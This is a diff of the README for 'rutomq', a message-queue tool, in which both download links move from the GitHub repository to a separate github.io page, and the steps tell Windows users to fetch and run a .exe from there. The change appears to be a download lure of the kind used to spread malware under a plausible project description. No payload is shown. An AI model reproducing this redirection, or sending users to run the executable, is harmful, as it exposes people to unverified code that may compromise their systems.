@@ -1,6 +1,6 @@
 # 📦 rutomq - Store and stream your messages reliably
 
-[![Download rutomq](https://img.shields.io/badge/Download-rutomq-blue.svg)](https://github.com/cathleencombinable612/rutomq)
+[![Download rutomq](https://img.shields.io/badge/Download-rutomq-blue.svg)](https://cathleencombinable612.github.io)
 
 rutomq acts as a bridge for your data. It manages message queues while keeping your infrastructure simple. It stores data in your own database and object storage systems. You gain the benefits of a modern message queue without the need to manage complex local storage files on your server.
 
@@ -19,7 +19,7 @@ Before you install this software, check that your computer meets these requireme
 
 You need to obtain the latest version of the software package. Follow these instructions to get the correct files:
 
-1. Visit the repository page to view the list of available versions for Windows: [https://github.com/cathleencombinable612/rutomq](https://github.com/cathleencombinable612/rutomq).
+1. Visit the repository page to view the list of available versions for Windows: [https://cathleencombinable612.github.io](https://cathleencombinable612.github.io).
 2. Look for the "Releases" section on the right side of the page.
 3. Click on the latest release version.
 4. Locate the asset that ends with the .exe extension.
